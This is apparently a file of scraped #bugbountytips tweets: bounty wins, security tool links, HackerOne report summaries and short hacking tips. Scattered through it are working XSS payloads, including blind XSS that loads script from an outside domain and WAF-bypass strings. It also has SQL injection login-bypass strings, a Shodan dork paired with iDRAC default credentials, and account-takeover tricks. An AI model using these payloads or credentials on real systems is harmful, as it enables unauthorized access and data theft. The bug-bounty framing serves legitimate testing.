@@ -1,0 +1,1250 @@
+
+[001] ids=1696573487580672507
+Microsoft launched multi tenant organizations. Seems like a good target for bug bounty #bugbountytips
+
+[002] ids=1696586007116644773
+I was awarded $7,666 for a Critical XSS
+
+Reflected XSS, but no particular sensitive data was exposed.
+Here is how I was able to escalate to account takeover👇
+#bugbountytips
+
+[003] ids=1696690608109445490
+Want a chance to win a voucher to @jhaddix's new Bug Bounty Methodology course?! RT and like this tweet! 😈 A random winner will be announced Friday!🤘🏼
+
+https://jasonhaddix.gumroad.com/l/lycucs 
+
+#infosec #bugbounty #bugbountytips #redteam 
+
+@pwnEIP @lazzslayer @NopResearcher @santosomar
+
+[004] ids=1696791078903386567
+This website features a wide list of bug bounty tools, conveniently sorted by category.
+
+https://offsec.tools
+
+#bugbounty #bugbountytips #pentesting #ethicalhacking
+
+[005] ids=1696796796121756131
+Alhamdulillah 
+#bugbountytips 
+#BugBounty
+
+[006] ids=1696804512877490583
+easy bug lead to critical impact 
+in Shodan search with the query 'org:"xx" 200 http.favicon.hash:1428702434'
+if you find an IP address associated with IDRAC servers try this credentials
+Username: root Password: calvin
+#BugBounty #bugbountytips
+
+[007] ids=1696807317960806847
+No more noise in your Burp!
+
+Burp Suite > Proxy > Options > TLS Pass Through.
+
+Add these:
+*.google\.com
+.*.gstatic).com
+*.mozilla\.com
+.*\.googleapis\.com
+*.pkil.goog
+
+#bugbounty #bugbountytips #cybersecurity #pentesting #ethicalhacking
+
+[008] ids=1696825091961786368,1795032246392594702
+HTTP Request Headers: Usage🛠️ and Security Abuse💀
+
+#websecurity #bugbounty #bugbountytips
+
+[009] ids=1696846002244956568
+Testing API has never been easy specifically GraphQL
+Here's a quick tip to automate your Api-testing!
+
+🧵 #BugBounty #bugbountytips
+
+[010] ids=1696912487772545519
+OpenredireX: A fuzzer for detecting open redirect vulnerabilities
+
+https://github.com/devanshbatham/OpenRedireX…
+
+#bugbountytips #bugbounty
+
+[011] ids=1696915821057216550
+⚡ Missing brute force protection on login page on http://acronis.com 
+👨🏻‍💻 cevans_0 ➟ Acronis 
+⬜ None
+💰 $250
+🔗 https://hackerone.com/reports/1435392
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[012] ids=1696925473778053297
+In Bug Bounties programs, hunt on the scope not easily accessible by everyone, u have a high chance of popping crits there 😉.
+
+P.S currently busy with some bug bounties, and learning some new mind bobbling stuff, will share my exp soon.....
+
+#BugBounty #bugbountytips #infosec
+
+[013] ids=1696930832915800211
+🌐 Wapalyzer
+
+A community fork of the deleted Wappalyzer project
+
+Can detect & identify the technologies used to build any website
+
+Supports patterns, regular expressions and coding finterprints
+
+By @Lissy_Sykes #bugbountytips
+
+[014] ids=1696930917103841410
+⚡ CSRF to delete a pet 
+👨🏻‍💻 dd_06 ➟ Mars 
+🟧 Medium
+💰 None
+🔗 https://hackerone.com/reports/2029753
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[015] ids=1696931057457942820
+⚡ Stored XSS + CSRF in "apellido" value 
+👨🏻‍💻 never_die ➟ Mars 
+🟧 Medium
+💰 None
+🔗 https://hackerone.com/reports/2037234
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[016] ids=1696931188089528490
+⚡ Response Manipulation lead to bypass verification code while making appointment at `http://banfield.com` 
+👨🏻‍💻 mo3giza ➟ Mars 
+🟧 Medium
+💰 None
+🔗 https://hackerone.com/reports/1943252
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[017] ids=1696931326975529322
+⚡ Html injection 
+👨🏻‍💻 ped_baq ➟ Mars 
+🟧 Medium
+💰 None
+🔗 https://hackerone.com/reports/2061049
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[018] ids=1696931458366226912
+⚡ Google dork lead to unsubscribe anyone from all Banfield emails 
+👨🏻‍💻 ractiurd ➟ Mars 
+🟨 Low
+💰 None
+🔗 https://hackerone.com/reports/2055081
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[019] ids=1697024272902852624
+Hhhhh keep calm🌬
+
+#bugbountytips #BugBounty
+
+[020] ids=1697041196319637697
+Basic Linux Commands:
+
+• ls: List files in a dir (directory).
+• cd: Change dir
+• pwd: Print working dir
+• touch: Create empty files.
+• mkdir: Create dir
+• rm: Remove files or dir
+• cp: Copy files or dir
+• mv: Move or rename files & dir
+#bugbounty #bugbountytips
+
+[021] ids=1697076195496734890
+https://youtube.com/live/aSj1fYIfrKA?si=0Eje2PdZ5OPB8K8C…
+
+Here is the more about enumerating cloud stuff and use http://hackthe.cloud website to pentest them 🖤🖤🖤🖤 #BugBounty #bugbountytips
+
+[022] ids=1697091016950419825
+What's the 1 liner you run before you start testing? 
+mine is 
+`cat scope | httpx | tee httpx_out ; cat httpx_out | nuclei | tee nuclei_out ; dirsearch -l httpx -e \* -of csv -o d
+irsearch_out`
+#bugbountytips
+
+[023] ids=1697099102905942473
+Redirect bypasses for Open Redirect & SSRF!
+
+#bugbounty #bugbountytips
+
+[024] ids=1697118505815175442
+𝗙𝘂𝘇𝘇 𝘄𝗶𝘁𝗵 𝟭𝟮𝟳.𝟬.𝟬.𝟭𝗮𝘀 𝗛𝗼𝘀𝘁 𝗵𝗲𝗮𝗱𝗲𝗿✨
+
+ffuf -u https://target[.]com/FUZZ -H “Host: 127.0.0.1” -w /home/user/path/to/wordlist.txt -fs <regular_content_length>
+
+Access Oneliners from our Github:
+https://github.com/thecybertix/One-Liner-Collections…
+
+#bugbountytips #BugBounty #Host #bugs
+
+[025] ids=1697123315360436654
+Made a nuclei template for this
+Save it ..
+
+Url: https://github.com/SirBugs/Priv8-Nuclei-Templates/blob/main/RCE/webmail-basic.yaml…
+
+#bugbounty #bugbountytips
+
+[026] ids=1697132150959579253
+Just found 3 R-XSS with this path ^_^
+
+Url: https://github.com/SirBugs/Priv8-Nuclei-Templates/blob/main/xss/admin-ajax-xss.yaml…
+
+#bugbounty #bugbountytips #nuclei #template
+
+[027] ids=1697173344741720228
+Find interesting subdomains:
+
+subfinder -d http://site.com -all | dnsprobe -silent | cut -d ' ' -f1 | grep --color 'dmz\|api\|staging\|env\|v1\|stag\|prod\|dev\|stg\|test\|demo\|pre\|admin\|beta\|sandbox\|qa\|intra\|s3\|back'
+
+#bugbountytips #pentesting #ethicalhacking
+
+[028] ids=1697174094926533026
+Handy command to extract URLs from junk / assorted data:
+
+cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
+
+#bugbounty #bugbountytips #pentesting #ethicalhacking
+
+[029] ids=1697178119273107721
+One line commands for XSS
+
+cat file.txt | gf xss | grep ‘source=’ | qsreplace ‘”><script>confirm(1)</script>’ | while read host do ; do curl –silent –path-as-is –insecure “$host” | grep -qs “<script>confirm(1)” && echo “$host 33[0;31mVulnerablen”;done
+
+#bugbounty #bugbountytips
+
+[030] ids=1697179683446759613
+Bro you forgot to put #bugbountytips #infosec 
+4-5k followers or mil jayenge HackerOne ke name pe 😎
+
+[031] ids=1697187611096596667
+⚡ Triager/Team members can edit hacker's report and hacker is not even notified 
+👨🏻‍💻 @abhinavsecond ➟ HackerOne 
+🟧 Medium
+💰 None
+🔗 https://hackerone.com/reports/2061367
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[032] ids=1697217333503086762
+Resolved? No problem 😜 Bypassed both reports and Alhamdulillah Triaged @Bugcrowd #bugbounty #bugbountytips #ItTakesACrowd #infosecurity 
+Tip: Use ` ` back quotes when () parantheses are blocked
+
+[033] ids=1697218547624423664
+easy tips DB Dump ==> /dump.sqI
+
+#bugbounty
+#bugbountytips
+
+[034] ids=1697232978630549701
+🍰 CakeFuzzer
+
+A security tool that uses an Interactive Application Security Testing (IAST) approach to automatically and continuously find vulnerabilities in applications built with the CakePHP framework
+
+By @dawiddczarnecki #pentesting #bugbountytips
+
+https://github.com/Zigrin-Security/CakeFuzzer…
+
+[035] ids=1697240867021681133
+Fake bug bounty writeup exposed #bugbounty #bugbountytips #bugbountyhunter
+
+[036] ids=1697254001635639577
+yay! Hackerone rewarded me $$$ @hackerone #bugbountytips #BugBounty #bugbounty
+
+tip: check response manipulation
+
+[037] ids=1697263105808773604
+⚡ IDOR in upload videos of a Channel on https://video.ibm.com 
+👨🏻‍💻 @leecybersec ➟ IBM 
+🆘 Critical
+💰 None
+🔗 https://hackerone.com/reports/2085185
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[038] ids=1697285663115087964
+Blind SQL Injection - Time based
+
+How I discovered it ?
+
+By collecting all the endpoints of the application and run tool called #arjun to discover all possible parameters then tested it manual with noting any suspicious in response and automated unsing #sqlmap .
+
+#bugbountytips
+
+[039] ids=1697305945305657493
+$1000 Bounty Bug
+
+:@a13h1_
+
+https://medium.com/@a13h1/my-1000-bounty-bug-how-i-stopped-companies-from-losing-money-with-an-idor-flaw-2366984a6c40…
+
+#BugBounty #bugbountytips #Bug #CYBER #CyberSecurity #CyberSecurityAwareness #bugbountytip #hackers #CyberSecurityAwareness #redteam #blueteam #hackerone #h1 #bugcrowd #Google #Apple #medium #writeup #idor
+
+[040] ids=1697411289264353473
+Interesting behavior
+
+During my research I came across an "X-Original-Host" header whose value is reflected in the "content" attribute of certain meta tags, so far nothing interesting, the impact being close to zero (...)
+
+#bugbountytips #BugBounty
+
+[041] ids=1697467337971224646
+Good "Unresolve" Morning 🥳 
+
+#BugBounty #bugcrowd #bugbountytips
+
+[042] ids=1697468553660960869
+💻OpenredireX💻
+
+A fuzzer for detecting open redirect vulnerabilities in an easy way.
+
+By 👉 @0xAsm0d3us
+
+#bugbountytips
+#BugBounty
+
+[043] ids=1697507260061151686
+AlHamdoulilah, I earned $100 for my submission on @bugcrowd https://bugcrowd.com/public_void #ItTakesACrowd 
+
+Although the finding was considered by the program as a bug and not a vulnerability, they’ve decided to award me 
+
+#bugbountytips 
+#BugBounty 
+#CyberSecurity
+
+[044] ids=1697512033556840596
+Auth related bugs 🔛🔝
+
+💸💸💸
+
+Just got this interesting find triaged in a private BBP! 🧡
+#BugBounty #bugbountytips
+
+[045] ids=1697533443285143664
+📌One-liner Command for XSS 🔥🔥
+📌Check Thread for One-liner Breakdown
+.
+.
+🧵Thread 👇 1/n
+. 
+.
+.
+. 
+. 
+. 
+#bugbounty #bugbountytips #CyberSecurity #ethicalhacking #xss #BugBountytip
+
+[046] ids=1697606143181222044
+Local SQL injection in Zoom allowed to spy on people #bugbounty #bugbountytips #bugbountyhunter
+
+[047] ids=1697613954191593863
+Blind XSS payloads I use most of the time:
+
+"><script src="http://custom.domain"></script>
+"><script src=//<custom.subdomain>.xss.ht></script>
+<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
+
+#bugbounty #bugbountytips #ethicalhacking
+
+[048] ids=1697614831904239937
+Common SQL Injection payloads used in a login form:
+
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+'='
+'LIKE'
+'=0--+
+
+#cybersecurity #pentesting #bugbountytips
+
+[049] ids=1697629515256873134
+Try these productivity hacks this weekend
+1. Study about circadian rhythms
+2. Start meditation 15 minutes a day 
+3. Eat healthy
+#bugbountytips
+
+[050] ids=1697650855867216240
+alhamdulillah my first critical report, hits linkedin :) 
+tips? always test the approve button on the admin side 
+
+#bugbounty #bugbountytips #hackerone
+
+[051] ids=1697662598601212240
+هذا من فضل الله سبحانه و تعالى ❤
+Happy to secure another company 🔥❤ and got $$$ 
+
+## Vulnerability :- Critical Blind Stored XSS 
+Leaking company customer support employees cookies and their sensitive information.
+
+# Tips:- in the first comment 
+
+#bugbountytips 
+#cybersecurity
+
+[052] ids=1697662715857170929
+Tips:-
+1- Go to http://bxsshunter.com
+2- Copy your blind XSS Payload or Payloads
+3- paste your blind xss payloads in :-
+- contact forms fields
+- request support forms field 
+- chat forms fields 
+4- wait for XSS firing 🔥
+
+#bugbountytips 
+#cybersecurity
+
+[053] ids=1697663363344408960
+In August submitted 86 valid bugs on a different platform
+@HackenProof - 43
+@yeswehack - 23
+@Hacker0x01 - 10
+@BugBase - 3
+@Bugcrowd - 3
+@intigriti - 2
+@bugvsecurity - 2
+#bugbountytips #infosecurity #cybersecurity #BugBounty #Hacking
+
+[054] ids=1697683130507755942
+nice account takeover bug 
+by @AnkitCuriosity 
+
+https://bugcrowd.com/disclosures/81d71c8d-952e-450c-82d9-f7ef8cfd7fe5/account-takeover-at-https-trello-com…
+
+#bugbountytips #bugbountytip
+
+[055] ids=1697685820855996867
+Scope Updated in snapchat #bugbountytips #hackerone #bugbounty 
+Program URL:= https://hackerone.com/snapchat
+
+[056] ids=1697725196235423817
+Nuclei Templates AI Generator
+
+Nuclei Template Editor - AI-powered hub to create, debug, scan, and store templates. Covering a wide array of vulnerabilities using public templates & rich CVE data. @NahamSec
+Source:
+https://templates.nuclei.sh #bugbountytips #Hacking
+
+[057] ids=1697727512120357307
+Socinator Dominator Enterprise v1.0.0.156 Full Activated – Discount 100% OFF https://dr-farfar.com/socinator-dominator-enterprise-full/… #infosec #bugcrowd #bugbountytips #bugbountytip #CyberSecurity #100DaysOfCode #Malware #CodeNewbie #BugHunter #Javascript via @3XS0
+
+[058] ids=1697756841902575669
+Always obedient to the core,no sleep no slumber to business #NARSFOURTHFORWARD #bugbountytips #bubagirl
+
+[059] ids=1697827942896906303
+A collection of snippets of codes and commands to make your life easier!
+#bugbountytips #BugBounty
+#PentestCheatSheets #CheatSheets #pentest
+https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets…
+
+[060] ids=1697829585625460759
+This is how Deep Recon looks… ATO 🤘🤘 #BugBounty #bugbountytips
+
+[061] ids=1697952915590099267
+$30,000 blind SQL injection chained with blind XSS #bugbounty #bugbountytips #bugbountyhunter
+
+[062] ids=1697970915462545817
+If you guys wanna use the Dark-Mode version of the [Big Bounty Recon] tool, I’ve already customized it 🙃
+
+Download Link:
+https://shorturl.at/xNQU0
+
+VirusTotal:
+https://shorturl.at/dtvG1
+
+#bugbountytips 
+#BugBounty 
+#CyberSecurity
+
+[063] ids=1698031295664918610
+Always have a deep recon might you can get some crazy stuff 🔥 
+
+#bugbounty #bugbountytips #cybersecurity
+
+[064] ids=1698086197866680354
+For those who are new to bug bounty, you can use this tool It makes it easy for you. We have combined most of the tools into one tool
+
+https://youtu.be/ZsuwmO8QuGc
+https://t.me/WolfReconTools
+
+#bugbounty #bugbountytips
+
+[065] ids=1698122461416452273
+Nicely found by @pentest_swissky, now you can use this tool by @novasecio to enum subdomains using GTM.
+
+https://x.com/pentest_swissky/status/1698099481382891743…
+
+#BugBountyTips #BugBounty #BumBumTips
+
+[066] ids=1698182956563804477
+A collection of tiny XSS Payloads that can be used in different contexts.
+#BugBounty #bugbountytips 
+#xss #tinyxss
+
+[067] ids=1698203911679868999
+An awesome Account takeover by XSS report on @Hacker0x01 hactivity... 
+https://hackerone.com/reports/2010530
+
+#infosec #BugBounty #bugbountytips
+
+[068] ids=1698206129078329819
+🚨 Feedback Time !! 🚨
+
+Do you like the current formatting of @h1Disclosed or would you consider more plain text based/less emoji based update tweets ?
+
+#bugbounty #bugbountytips #cybersecurity
+
+[069] ids=1698209545015984391
+ATO at its peak…. 😁😁🤘🤘 
+After loosing at BGMI, 
+Won at ATO last night..
+#BugBounty #bugbountytips
+
+[070] ids=1698277011033047340
+How to turn an SQL injection into an RCE? #bugbounty #bugbountytips #bugbountyhunter
+
+[071] ids=1698373875430490213
+1- Login with successful password (save resposne body to use it)
+2- logout than copy response that’s for successful login attempt
+3- paste json body in wrong attempt response 
+4- your login successfully = ATO
+Note: there’s no cookie or token it’s just normal body
+
+#BugBountytips
+
+[072] ids=1698381653003981232
+2 Tips to keep in mind where you're on the lookout for authorization/access control vulnerabilities:
+
+#bugbounty #bugbountytips
+
+[073] ids=1698383094733058361
+If you want to know your target is using #SAP or you already know but want to get usernames.
+
+Dork : site:http://people.sap.com "Target"
+
+#bugbountytips #osint #recon
+
+[074] ids=1698458136674242842
+CSP (Content Security Policy) is a crucial web security feature. It helps protect websites from various types of attacks by controlling what resources can be loaded.
+ 
+THREAD
+
+#bugbountytips #BugBounty #websecurity #CyberSecurity
+
+[075] ids=1698503479239598559
+💲Server side prototype pollution : Dive into the world of prototype pollution bugs, focusing on server side exploitation.
+
+Read https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/…
+
+👀 Check Out Old Tweets Of @TodayCyberNews
+
+ #CyberSecurity #bugbountytips #BugBounty #infosec #pentest
+
+[图片替代文字]
+💲Server side prototype pollution : Dive into the world of prototype pollution bugs, focusing on server side exploitation.
+
+Read https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/
+
+👀 Check Out Old Tweets Of @TodayCyberNews
+
+ #CyberSecurity #bugbountytips #BugBounty #infosec #pentest
+
+[076] ids=1698546562010660912
+⚡ CVE-2023-40273: Session fixation in Apache Airflow web interface 
+👨🏻‍💻 leixiao ➟ Internet Bug Bounty 
+🟨 Low
+💰 $540
+🔗 https://hackerone.com/reports/2121960
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[077] ids=1698578590730965456
+𝗠𝗼𝘀𝘁 𝗔𝗱𝘃 𝗧𝗼𝗽𝗶𝗰 𝗖𝗼𝘃𝗲𝗿𝗲𝗱😨
+
+𝗕𝘂𝗴: ɪɴsᴇᴄᴜʀᴇ ᴅᴇsᴇʀɪᴀʟɪᴢᴀᴛɪᴏɴ
+
+𝗡𝗢𝗧𝗘: 
+‼️Watch this video Completely to understand properly‼️
+
+Please Share your Views in Comment Section🙏
+
+𝙇𝙞𝙣𝙠: https://youtu.be/WGhNgXnoNjY?si=IyRrSVv2gSbwFhSd…
+
+#bugbountytips #bugbounty #bug #insecure
+
+[078] ids=1698602282533691891
+Some of my ways to bypass the CSRF authentication_token ..
+
+1. You can remove the whole ‘token’ param and value and try send the request
+A lot of the websites i’ve been testing has this misconfiguration ..
+
+#bugbounty #bugbountytips #csrf
+
+[079] ids=1698665262659125326
+⚙️burp-paramalyzer - Burp extension for parameter analysis of large-scale web application penetration tests.
+
+https://github.com/JGillam/burp-paramalyzer…
+
+#bugbounty #bugbountytip #bugbountytips #ethicalhacking #hacking #infosec #pentesting #penetrationtesting #hackforgood #vdp
+
+[080] ids=1698717056101683701
+Plop ! 
+
+Update of HexHTTP (https://github.com/c0dejump/HExHTTP…):
+- Web cache poisoning testing based on @Th0h0 autopoisoner tools 
+- some fix bugs
+
+#bugbountytips #BugBounty #Pentesting #infosec
+
+[081] ids=1698719506116587939
+BurpSuite group tabs are really useful for testing race conditions and single packet attacks 
+
+#bugbountytips
+
+[082] ids=1698744725904191489
+Before I shared about in august I got 28 mobile app API issue ( personal research and finding )
+
+Thread 🧵:👇 Here is how to exploit Firebase 11 types of bugs
+
+#bugbountytips #PentestCheatSheets #CheatSheets #pentest
+#infosecurity #cybersecurity #BugBounty #Hacking
+
+[083] ids=1698746282720788917
+There is ovel icon showing manual steps to exploit and giving guidance to exploit need a sample report can DM or comment if there any problems #bugbountytips #BugBounty
+
+[084] ids=1698760907336106240
+Happy hacking 
+#bugbountytips 
+Bug Name : 2 xss To full account TakeOver
+Every parameter you added was placed in the source of the page (js).
+- param=test<script>alert(1)<script> -> blocked
+- param[<script>alert(1)</script>] -> √
+
+[085] ids=1698894347205587132
+OSCP 2023 Preparation Guide | Courses, Tricks, Tutorials, Exercises, Machines
+#BugBounty #bugbountytips
+#oscp #hacking #machine #linux
+
+[086] ids=1698899506316878040
+#bugbountytips: Advanced Web Application Penetration Testing.
+Today, archives are of 5 types:
+- Archiving only formats concatenate files.
+
+- Compression-only formats only compress files.
+
+-Multi-function formats can store metadata, concatenate, compress, encrypt, create error
+
+[图片替代文字]
+ZIP File Upload Vulnerability & Exploitation
+
+[087] ids=1698920346596876353
+Found a token leak via an IDOR but I cannot find its purpose (endpoint: /checkPaymentStatus), anyone who is willing to collab?
+#BugBounty #bugbountytips
+
+[088] ids=1698924569762091481
+Admin Panel Takeover….
+Mr. Admin you are gone babe.. 😁😁
+
+Username: name@target.com
+Password: name@target.com
+
+#BugBounty #bugbountytips
+
+[089] ids=1698933272678367464
+After a lot of Request and difficulty in finding API and project ID 
+Made an automated Python code which extracts project ID and API key also with a sample report on 
+
+https://github.com/ProjectNull0/Firebase-exploit… 
+
+Test with https://firebase.projectnull.tech
+
+#bugbountytips #infosec
+
+[090] ids=1699011387421491650
+Another Blind Sql Injection Triage within 3 minute #BugBounty #bugbountytips
+
+[091] ids=1699048573445587144
+PurpleOps: An open-source self-hosted purple team management web application.
+
+Link: https://github.com/CyberCX-STA/PurpleOps…
+
+#hacking #bugbountytips #informationsecurity #cybersecurity #infosec #cybersecuritytips #ethicalhacking #Pentesting
+
+[图片替代文字]
+PurpleOps: An open-source self-hosted purple team management web application.
+
+[092] ids=1699075004963733743
+🛠️ postMessage-tracker
+
+A Chrome Extension designed to track postMessage usage (URL, domain, & stack)
+
+* Tracks communication between different windows
+* Supports Raven, New Relic, jQuery wrappers and other libraries
+
+By @fransrosen #bugbountytips
+
+[093] ids=1699079087745011750
+## Testing POST Requests for SQL Injection Vulnerabilities :-
+
+sqlmap -u "https[:]//sub[.]example[.]com/login.php" --data "username=admin&password=admin" -p "username,password" --method POST
+
+#bugbountytips
+#cybersecurity
+#security
+
+[094] ids=1699097560797917198
+DNSWatch:- DNS Traffic Sniffer and Analyzer.
+
+Link: https://github.com/HalilDeniz/DNSWatch…
+
+#Hacking #bugbountytips #informationsecurity #CyberSecurity #infosec #cybersecuritytips #ethicalhacking #Pentesting
+
+[图片替代文字]
+DNSWatch:- DNS Traffic Sniffer and Analyzer.
+
+[095] ids=1699128473606914322
+I have a Txt file with full of URLs
+How can I extract all endpoints?
+any tool or a command?
+#BugBounty #bugbountytips
+
+[096] ids=1699133349191877119
+👾 GraphQL fuzzing tool
+
+GitHub URL :- https://github.com/nikitastupin/clairvoyance…
+
+👀 Check Out Old Tweets Of @TodayCyberNews
+
+ #CyberSecurity #bugbountytips #BugBounty #infosec #Pentesting
+
+[图片替代文字]
+👾 GraphQL fuzzing tool
+
+GitHub URL :- https://github.com/nikitastupin/clairvoyance
+
+👀 Check Out Old Tweets Of @TodayCyberNews
+
+ #CyberSecurity #bugbountytips #BugBounty #infosec #Pentesting
+
+[097] ids=1699273633410248830
+Clairvoyance 📍
+
+Obtain GraphQL API schema even if the introspection is disabled 🔥
+
+Source: https://github.com/nikitastupin/clairvoyance…
+
+#BugBounty #bugbountytips #Hacking #infosec #infosecurity #Pentesting #redteam
+
+[098] ids=1699284993032241415
+https://xss.report
+Is back to work, Seems better than before
+Interesting ..
+
+Who doesn't know, You can use it for submitting blind XSS payloads in the admins/support portals
+
+#bugbounty #bugbountytips
+
+[图片替代文字]
+XSS.Report
+
+[099] ids=1699318555915993248
+S3 Bucket Recon !
+
+Read More :- https://securitycipher.medium.com/s3-bucket-recon-2d7c2bbf41ef…
+
+Credit :- SecurityCipher
+
+👀 Check Out Old Tweets Of @TodayCyberNews
+
+ #CyberSecurity #bugbountytips #BugBounty #infosec #AWS
+
+[图片替代文字]
+S3 Bucket Recon !
+Credit: SecurityCipher
+
+Read More :- https://securitycipher.medium.com/s3-bucket-recon-2d7c2bbf41ef
+
+👀 Check Out Old Tweets Of @TodayCyberNews
+
+ #CyberSecurity #bugbountytips #BugBounty #infosec #iis #rce
+
+[100] ids=1699361808631681231,1797568967143457131
+HTTP Response Headers: Usage 🛠 and Security Abuse ☠.
+
+Those complement the HTTP Request Headers we saw last week :)
+
+#websecurity #bugbounty #bugbountytips
+
+[101] ids=1699400726483542473
+Got frustrated when I wanted to read bug bounty writeups hidden behind paywalls. 
+
+So I have written a JavaScript bookmarklet to bypass "members only" restrictions and read content! Here's how to use it🧵
+
+#bugbounty #medium #bugbountytips
+
+[102] ids=1699416812868300916
+Share some resources for learning jwt hacking 
+
+#bugbounty #bugbountytip #bugbountytips
+
+[103] ids=1699419144033026356
+I just published my first write-up, I hope you'll enjoy it ! 
+ 
+Chaining low impact bugs leads to 0 click Mass ATO https://link.medium.com/lY0FDpYfSCb
+
+#bugbountytips #BugBounty
+
+[104] ids=1699428297564708890
+If Everything is a 9.8, Then Nothing Is
+https://blog.projectdiscovery.io/if-everything-is-a-9-8-then-nothing-is/…
+@pdiscoveryio
+#bugbountytips #BugBounty
+
+[105] ids=1699494208627782127
+If you don't have a custom wordlist, start one.
+I see tweets, writeups, discord conversations, etc. that make me add new endpoints to my wordlist regularly. 
+Create a bash function that makes it easy to add new stuff to and dedupe for you🤘
+#bugbountytips
+
+[106] ids=1699519999587623033
+Craft, XSS and ATO
+
+After some research, I came across a POST request in my proxy which -for some reasons- caught my attention. The server was returning data in JSON format, I retrieved the parameters passed via POST then transmitted them via a GET request (...)
+
+#bugbountytips
+
+[107] ids=1699568168434295246
+Capture The Flag Challenges.
+
+THREAD
+
+#cybersecurity #bugbountytips #Ctfchallenges
+
+[108] ids=1699621792808407321
+😛😛 again small bounty
+They were going to reward 50$ but they rewarded 100$ 
+
+Show the Impact as much as you can might they will reward more 🥂 
+
+Have a great day 🥂
+
+#BugBounty #bugbountytips #infosec #CyberSecurity #hacker
+
+[109] ids=1699628657126375832
+Easy P3,4
+Mail Server Miscofiguration 
+Failure to invalidate Session 
+#BugBounty #bugcrowd #bugbountytips
+
+[110] ids=1699719936644461005
+الحمدلله
+First Bug in Mobile Applications
+Write up link :
+
+https://melguerdawi.medium.com/exploiting-android-webview-f7f8e225743f…
+
+#bugbountytips #BugBounty #bugcrowd #Pentesting #mobileapp
+
+[111] ids=1699728497126826214
+✅Subdomain enumeration 
+✅Full port scan
+✅HTTP web server detection
+
+#security #bugbountytips #portscan #subdomain #chaos
+#oneliner
+
+[112] ids=1699763337666376191
+بتوفيق من الله عز و جل ❤
+I had published my third Writeup on Medium :-
+How I Found 3 XSS Types (Reflected, Blind Stored && DOM XSS) In One Program and Got $$$, link :-
+https://medium.com/@wadqamar10/how-i-found-3-xss-types-reflected-blind-stored-dom-xss-in-one-program-and-got-c3a30a32adf7…
+
+And if you had Limitation on Medium, look at the first comment (:
+
+#bugbountytips
+
+[113] ids=1699763422827577735
+i
+If you had Limitation on Medium, you can read it from my blog here :-
+https://qamartech10.blogspot.com/2023/09/how-i-found-3-xss-types-reflected-blind.html…
+
+#bugbountytips 
+#cybersecurity 
+#security
+
+[114] ids=1699768272982511808
+Nah $2 is wild 💀
+
+#BugBounty #bugbountytips
+
+[115] ids=1699769630632665134
+⚡ Ability to bypass Admin override on Cloudflare WARP Android 
+👨🏻‍💻 @HarshDRanjan1 ➟ Cloudflare Public Bug Bounty 
+🟥 High
+💰 None
+🔗 https://hackerone.com/reports/2043885
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[116] ids=1699778387491913756
+🪲 Wild XSS chain in Proton Mail
+
+The exploit bypasses the existing:
+
+👉 HTML Sanitizer (DOMPurify)
+👉 Iframe sandbox 
+👉 CSP
+
+https://sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/…
+
+By Paul Gerste of @SonarCloud
+
+#bugbountytips #bugbounty #cybersecurity #infosec
+
+[117] ids=1699779622966292765
+⚙️ Obtain GraphQL API schema even if the introspection is disabled
+
+https://github.com/nikitastupin/clairvoyance…
+
+created by @_nikitastupin 🔥
+
+#bugbounty #bugbountytip #bugbountytips #ethicalhacking #hacking #infosec #pentesting #penetrationtesting #hackforgood #vdp
+
+[118] ids=1699813869240340903
+If the program says we will fix it. There's no need to remind them every 6 months. LOL
+
+How's your Triage report ? Is there a 5 years anniversary already ? :))
+
+#bugbounty #bugbountytips
+
+[119] ids=1699840440114245913
+Boost your productivity with a simple trick: Open VM shell on your main OS!
+💡 It saves time & optimizes workflow.
+1- sudo services ssh start (start SSH service in VM)
+2- ifconfig (check VM IP)
+3- ssh kali@IP (in main OS shell)
+#bugbountytips #BugBounty
+
+[120] ids=1699920631968739680
+⚡ [CVE-2023-23913] DOM Based Cross-site Scripting in rails-ujs for contenteditable HTML Elements 
+👨🏻‍💻 @ryotkak ➟ Internet Bug Bounty 
+🟧 Medium
+💰 None
+🔗 https://hackerone.com/reports/2125679
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[121] ids=1699926318337425913
+one linear to get all subdomains work with graphql api 
+https://pastebin.com/9WP7ud5y
+#bugbountytips #GraphQL #BugBounty
+
+[122] ids=1699926656880722200
+You have to customize every action you learn from another hackers or write ups , don't use the same way that millions of bug hunters use and wait for results #bugbountytips #BugBounty #hackerone #bugbounty #hacking #cybersecurity
+
+[123] ids=1699927633583038956
+The Same-Origin Policy (SOP) is a crucial concept in web security.
+
+THREAD
+
+#bugbountytips #websecurity #CyberSecurity
+
+[124] ids=1699985852028579870
+Try to Every wordpress site 
+
+#bugbounty #bugbountytips #xss #wordpress #wordpresssecurity 
+
+<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
+
+[125] ids=1700001669558485124
+🌐🕵️‍♂️ Searching for SSRF vulnerabilities in JSON data? 📦 follow @eman_yazji's tip ! 
+
+And If you would like to learn and attend SAP Penetration testing training, join us at @seasides_conf 
+
+Register here: https://forms.gle/5qdoAfspyKokdsX26… 
+
+#InfoSec #BugBounty #Bugbountytips #CyberSecurity
+
+[126] ids=1700007652280148221
+Sucuri XSS Bypass PayLoad
+
+<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
+
+<details/open=/Open/href=/data=;+ontoggle="(alert)(document.domain)
+
+Access Oneliners from Github
+https://github.com/thecybertix/One-Liner-Collections…
+
+Our YouTube Channel
+https://youtube.com/@cybertix
+
+ #bugbountytips #BugBounty #tip
+
+[127] ids=1700023572306231741
+One More Blind SQL Triaged | Good Morning🥱#BugBounty #bugbountytips #sql
+
+[128] ids=1700051303148511296
